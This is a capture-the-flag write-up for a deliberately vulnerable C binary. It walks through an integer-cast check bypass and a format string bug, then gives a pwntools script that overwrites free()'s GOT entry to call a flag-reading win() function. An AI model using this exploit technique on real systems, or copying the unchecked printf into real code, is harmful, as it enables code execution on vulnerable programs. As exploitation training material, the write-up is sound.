Provided C code:

`stacking_melodies.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

/* 
   gcc -no-pie -g in.c -o out
*/

typedef void (*event_handler)(const char *, int);

struct session_context {
    event_handler server_logging;
    char session_id[16];
    uint32_t flags;
};

void log_event(const char *msg, int rating) {
    if (rating == -1) {
        printf("[STATUS]: %s\n", msg);
    } else {
        printf("[%s]: %d\n", msg, rating);
    }
}

int calculate_rating(){
    /*Saves and calculates rating, proprietary technology
    based on https://shorturl.at/kLKso*/
    return 0;
}

void win() {      // Our target
    char flag[128];
    FILE *fp = fopen("flag.txt", "r");
    if (fp) {
        fgets(flag, sizeof(flag), fp);
        printf("%s\n", flag);
        fclose(fp);
    }
    exit(0);
}

static inline int validate_size(uint32_t sz) {
    size_t aligned = (sz + 7) & ~7;
    return (int)aligned;          // typecasting, potential Integer overflow bug
}

void process_stream() {
    uint32_t header[3]; // 4 bytes each, positive values
    
    if (fread(header, 1, 12, stdin) < 10) exit(1);   // user input for file header (magic, t_len, d_len) 
    /*file magic*/
    if (header[0] != 0x564d576e) return;   // magic check

    uint16_t t_len = (uint16_t)(header[1] & 0xFFFF);
    uint32_t d_len = header[2];

    char *title = malloc(t_len + 1);
    if (title) {
        fread(title, 1, t_len, stdin);   // user input for `title` from stdin
        title[t_len] = '\0';
    }
    //arbitraty large size, so my storage doesnt fill up
    if (validate_size(d_len) > 2048) {
        puts("Stream limit exceeded.");
        exit(1);
    }

    size_t stream_size = (size_t)(d_len + 0x40); 
    char *stream_buf = malloc(stream_size);
    
    struct session_context *ctx = malloc(sizeof(struct session_context));
    if (!ctx || !stream_buf) exit(1);

    ctx->server_logging = log_event;
    memcpy(ctx->session_id, "SESSION_ACTIVE", 14);

    fread(stream_buf, 1, d_len, stdin);

    if (title) {
        printf("Entry: ");
        printf(title);             // print out `title` ==> formatstring vuln
        printf("\n");
    }
    int rating = calculate_rating();
    free(title);
    ctx->server_logging("Rating", rating);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    process_stream();
    return 0;
}
```
Compile the code and we check its binary file:

```c
┌──(kali㉿kali)-[~/CTFs/dawgCTF2026/pwn/stacking_melodies]
└─$ checksec --file=chall               
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   52 Symbols  No     0               4               chall

```
* `Partial RELRO`: GOT is overwritable
* `No canary`: no canary check when BOFing
* `No PIE`: the binary addresses stay fixed

___
### Exploit:
**First**
We initially have a structure:
```c
uint32_t header[3];
```
which consists of the following elements:
```c
- magic_num
- t_len
- d_len
```
and requires us to manually fill those datas:
```c
fread(header, 1, 12, stdin)
```

**Second**
We do see a bug inside a function:

Integer overflow:

<img width="754" height="394" alt="image" src="https://github.com/user-attachments/assets/34210c36-3846-4711-95f7-879b3fb80b89" />

In `main()`, a call to a function with `d_len` as argument:
```c
validate_size(d_len) > 2048
```
To the function:
```c
static inline int validate_size(uint32_t sz) {
    size_t aligned = (sz + 7) & ~7;
    return (int)aligned;          // typecasting, potential Integer overflow bug
}
```
We can leverage this bug to bypass the check

**Third**
We spot a formatstring vulnerbility inside the code:

```c
    if (title) {
        printf("Entry: ");
        printf(title);             // print out `title` ==> formatstring vuln
        printf("\n");
    }
```
With this, we have the ability to perform: arbitrary write, arbitrary read. But only once

Especially when we have the fixed address of `win`, we could overwrite it somewhere so it can be triggered

**Conclusion**
Our strategy: format string + GOT overwrite:

1. Send the correct file magic
2. Create a formatstring payload that overwrite the GOT address of `free()` with our `win()`. Both addresses r fixed.
3. Set `t_len` to the exact length of our payload
4. Set `d_len` to a valid size (maybe 16)
5. Send the header data, then our payload, then dummy data for the stream
6. When `printf(title)` executes, it performs the overwrite
7. And finally, `free()` is called, it will actually call to `win()`

___
Script: `scrript.py`:
```python
from pwn import *

elf = context.binary = ELF('./chall')
context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br process_stream
		br *process_stream+35
		br *process_stream+59

		br *process_stream+134
		br *process_stream+139

		br *process_stream+372
		br *process_stream+377
		''')

#nc.umbccd.net:8925
# p = remote("nc.umbccd.net", 8925)

p = process(exe.path)
GDB()

win = elf.sym['win']
target = elf.got['free']
offset = 6

payload = fmtstr_payload(offset, {target: win})
print(f"payload: {payload}\n")
print(f"payload-len: {len(payload)}\n")

# payload = b"%6$p"

magic = p32(0x564d576e)
t_len = p16(len(payload)) + p16(0) 
d_len = p32(16)

header = magic + t_len + d_len

p.send(header)
p.send(payload)
p.send(b"B" * 16)

p.interactive()
```

___
